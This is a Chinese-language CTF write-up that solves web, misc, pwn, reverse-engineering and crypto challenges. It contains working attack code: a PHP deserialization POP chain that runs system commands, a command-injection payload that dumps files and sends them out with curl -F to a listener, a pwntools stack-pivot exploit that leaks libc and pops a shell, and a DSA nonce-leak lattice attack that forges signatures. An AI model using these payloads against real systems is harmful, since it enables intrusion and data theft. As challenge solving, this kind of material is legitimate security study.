0x01 web
========

ezpop
-----

构造pop链，绕过eval 函数的注释

```php
<?php

class crow

{

public $v1;

public $v2;

function __construct($v1,$v2)

{

$this->v1=$v1;

$this->v2=$v2;

}

}

class fin

{

public $f1;

function __construct($f1)

{

$this->f1=$f1;

}

}

class what

{

public $a;

function __construct($a)

{

$this->a=$a;

}

}

class mix

{

public $m1;

function __construct($m1)

{

$this->m1=$m1;

}

}

$a = new fin(new what(new fin(new crow(new fin(new mix("?><?php system('cat *');?>")),'aa'))));

echo urlencode(serialize($a));
```

查看源代代码获得flag

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-8be75a17b563006d105dd91f6600dbeb792492e5.png)

clac
----

```php
/calc?num=1%23\`curl%09127.0.0.1:1234%09\-F%09xx=@/y3\`
```

然后先把回显写进文件，再curl带出来就行了

```php
/calc?num=1%23`cat%09/*>/y3`/calc?  
num=1%23`curl%09127.0.0.1:1234%09-F%09xx=@/y3`
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e713b3748a919c0a87b8879aff736b4c1d00f5a6.png)

0x02 Misc
=========

月圆之夜
----

网上找了一个字母表对应

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-65059464fa4fc99ca1ddc5c35f65f03a80cb9584.png)  
DASCTF{welcometothefullmoonnight}

问卷题
---

填写问卷

0x03 Pwn
========

checkin
-------

有0x10个字节大小的栈溢出，用栈迁移+修改got表来做

```from

p = process("./checkin")

#p = remote("node4.buuoj.cn",29509)

libc = ELF("./libc.so.6")

context.log_level = "debug"

context.arch = "amd64"

gdb.attach(p)

payload = b"a"*0xa0 + p64(0x4040c0+0xa0) + p64(0x4011BF)  #buf = 0x4040c0

p.send(payload)

payload = flat([  #csu

    0x404140,    #nouse

    0x40124A,  # pop 6

    0,1,      #rbx rbp

    0x404040, # stdout  r12

    0,0,    # r13 r14

    0x404020,  #r15 setvbuf_got

    0x401230,  # ret 

    0,0,   #+8 rbx

    0x404140, #rbp

    0,0,0,0, #12 13 14 15

    0x4011BF #read = put

    ])

payload = payload.ljust(0xa0,b"\\x00") + p64(0x404020+0xa0) + p64(0x4011bf) #read 

p.send(payload)

sleep(0.1)

p.send(b"\\x50\\xc4")

sleep(0.1)

libc_base = u64(p.recvuntil(b"\\x7f")\[-6:].ljust(8,b"\\x00")) -0x1ed6a0

success("libc_base:"+hex(libc_base))

p.send(b"a"*0xa0 +p64(libc_base+0xe3b2e)\*2 ) 

p.interactive()

~
              
```

0x04 Re
=======

easyre
------

ESP + RC4

关于少看个值重调了不知道多少遍

```php
#include <stdio.h>

#include <string.h> 

#define LEN 256

int xorKey[42];

void Swap(unsigned char * a, unsigned char * b);

void Rc4_Init(unsigned char * s, unsigned char * key, int klen);

void Rc4_Crypt(unsigned char * s);

int main(void) 

{

unsigned char s[LEN] = { 0 };

unsigned char key[LEN] = { "123456" };

int i, j;

int data[] = {0xC3, 0x80, 0xD5, 0xF2, 0x9B, 0x30, 0xB, 0xB4, 0x55, 0xDE, 0x22, 0x83, 0x2F, 0x97, 0xB8, 0x20, 0x1D, 0x74, 0xD1, 0x1, 0x73, 0x1A, 0xB2, 0xC8, 0xC5, 0x74, 0xC0, 0x5B, 0xF7, 0xF, 0xD3, 0x1, 0x55, 0xB2, 0xA4, 0xAE, 0x7B, 0xAC, 0x5C, 0x56, 0xBC, 0x23};

int xorKeyy[] = {0x38, 0x78, 0xDD, 0xE8, 0x00, 0xAF, 0xBF, 0x3A, 0x6B, 0xFB, 0xB8, 0x0C, 0x85, 0x35, 0x5C, 0xAD, 0xE6, 0x00, 0xE0, 0x8A, 0x1D, 0xBD, 0x46, 0xD2, 0x2B, 0x00, 0x15, 0x24, 0xC6, 0xAD, 0xA1, 0xC9, 0x7B, 0x12, 0x28, 0x00, 0x05, 0x00, 0x72, 0x3E, 0x10, 0xA1};

Rc4_Init(s, key, strlen(key));

Rc4_Crypt(s);

for ( i = 0; i < 42; i++ )

printf("%c", xorKeyy[i] & 0xFF  ^ (data[i] - 71));

return 0;

}

void Swap(unsigned char * a, unsigned char * b)

{

*a ^= *b;

*b ^= *a;

*a ^= *b;

}

void Rc4_Init(unsigned char * s, unsigned char * key, int klen)

{

unsigned char k[LEN] = { };

int i, j;

for ( i = 0; i < LEN; i++ )

{

s[i] = i;

k[i] = key[i % klen];

}

for ( i = 0, j = 0; i < LEN; i++ )

{

j = (j + s[i] + k[i]) % 256;

Swap(&s[i], &s[j]);

}

}

void Rc4_Crypt(unsigned char * s)

{

int i, j, k, t;

int v4; 

int v5 = 0;

for ( i = 0, j = 0, k = 0; k < 42; k++, xorKey[v5++] = s[(s[j] + s[i]) % 256] )

{

i = (i + 1) % 256;

    j = (j + s[i]) % 256;

    v4 = s[i] + 66;

    s[i] = s[j] - 33;

    s[i] ^= 2u;

    s[j] = 5 * v4;

    s[j] = s[i] - 10;

    s[j] += s[i];

    s[i] -= 18;

} 

}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4ebc9dc182624cac5008ab4aa947be69d43b0a3a.png)

0x05 Crypto
===========

FlowerCipher
------------

L%R是上一轮的R ，然后random.randint(0, 4096) 可以直接开三次方取int，如果不太对就调一调+1或者-1，本来以为要深搜一下（x 没想到直接有了。

```php
from hashlib import md5# from secret import flag

import random

flag = b'flag{%s}' % md5(b'1').hexdigest().encode()
# note that md5 only have characters 'abcdef' and digits

def Flower(x, key):

    flower = random.randint(0, 4096)

    return x * (key ** 3 + flower)

flag = flag[5:-1]

rounds = len(flag)

c = (15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899,139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003)

'''L, R = 1, 0

for i in range(rounds):

    L, R = R + Flower(L, flag[i]), L'''

# L%R是上一轮的R

L,R  =c

f = ''

while L!=1:

    L_1,R_1 = R,L%R

    # print(L,R)

    a = (L-R_1)//L_1

    f = f+(chr(int(a**(1/3))))

    L,R = L_1,R_1

print(f[::-1])
```

meet me in the middle
---------------------

这道题就是DSA高位低位泄露，D3其实那道差差不多，有2个思路

一个乘k让位置集中起来（懒得想 shallow应该D3wp里面有描述到

另外一个就是tolin师傅写的一篇blog 里面格子直接抄下来就行了

```php
from pwn import *

from Crypto.Util.number import *

from hashlib import sha256

import string

from pwnlib.util.iters import mbruteforce

table = string.ascii_letters+string.digits

def proof_of_work(io):

io.recvuntil(b"XXXX+")

suffix = io.recv(8).decode("utf8")

io.recvuntil(b"== ")

cipher = io.recvline().strip().decode("utf8")

proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==

cipher, table, length=4, method='fixed')

io.sendlineafter(b"XXXX :", proof)

def get_pub(io):

io.recv()

io.sendline(b'3')

io.recvuntil(b'p = ')

p = int(io.recvline().strip())

io.recvuntil(b'q = ')

q = int(io.recvline().strip())

io.recvuntil(b'g = ')

g = int(io.recvline().strip())

io.recvuntil(b'y = ')

y = int(io.recvline().strip())

key = (p,q,g,y)

return key

def get_sign(io):

io.recv()

io.sendline(b'1')

io.recvuntil(b'Your signature1 is:(')

r1 = int(io.recvuntil(b',')[:-1])

s1 = int(io.recvuntil(b')')[:-1])

io.recvuntil(b'Your signature2 is:(')

r2 = int(io.recvuntil(b',')[:-1])

s2 = int(io.recvuntil(b')')[:-1])

return r1,s1,r2,s2

def get_middle(io):

io.recv()

io.sendline(b'4')

io.recvuntil(b'middle_k0')

k0\_tmp = int(io.recvline().strip())

io.recvuntil(b'middle_k1')

k1_tmp = int(io.recvline().strip())

return k0_tmp,k1_tmp

if __name\__ == "__main__":

io = remote("node4.buuoj.cn",26299)

proof_of_work(io)

from sage.all import *

p,q,g,y = get_pub(io)

r0,s0,r1,s1 = get_sign(io)

m0 = b'What you want to know'

m1 = b'My dear lone warrior'

h0 = bytes_to_long(sha256(m0).digest())

h1 = bytes_to_long(sha256(m1).digest())

k0,k1 = get_middle(io)

l = len(bin(q)) - 2 - 30

t = (-inverse(s0*r1,q)*s1*r0 )% q

u = (inverse(s0*r1,q)*r0*h1-inverse(s0,q)*h0) % q

u_ = k0 + int(t) * k1 + int(u)

K = 1

Mat = matrix(

[[K,K*(1<<l),K*int(t),K*int(t)*(1<<l),u_],

[0,K*q,0,0,0],

[0,0,K*q,0,0],

[0,0,0,K*q,0],

[0,0,0,0,q]]

)

mat_bkz = Mat.BKZ(block_size = 22)

mat_bkz = list(mat_bkz)

new_mat = []

target = []

for i in range(len(mat_bkz)-1):

tmp = []

for j in range(len(mat_bkz[i]) - 1):

tmp.append(mat_bkz[i]\[j]//K)

target.append(mat_bkz[i][-1])

new_mat.append(tmp)

new_mat = Matrix(ZZ,new_mat)

target = vector(target)

print(new_mat)

print(target)

val = new_mat.solve_right(target)

print(val)

x1,y1,x2,y2 = val

x1,y1,x2,y2 = abs(x1),abs(y1),abs(x2),abs(y2)

k0_ = int(k0 + x1 + y1*(1<<l))

k1_ = int(k1 + x2 + y2*(1<<l))

print(k0_)

print(k1_)

print(pow(g,k0_,p)%q)

print(r0)

x = int((s0 * k0_ - h0 )*inverse(r0,q) % q)

m = b"I'm Admin.I want flag."

def sign( m):

k = 1111

h = bytes_to_long(sha256(m).digest())

r = int(pow(g, k, p) % q)

s = inverse(k, q) * (h + x * r) % q

return r, s

r,s = sign(m)

io.recv()

io.sendline(b'2')

io.recv()

io.sendline(m)

io.recv()

io.sendline(str(r).encode())

io.recv()

io.sendline(str(s).encode())

io.interactive()
```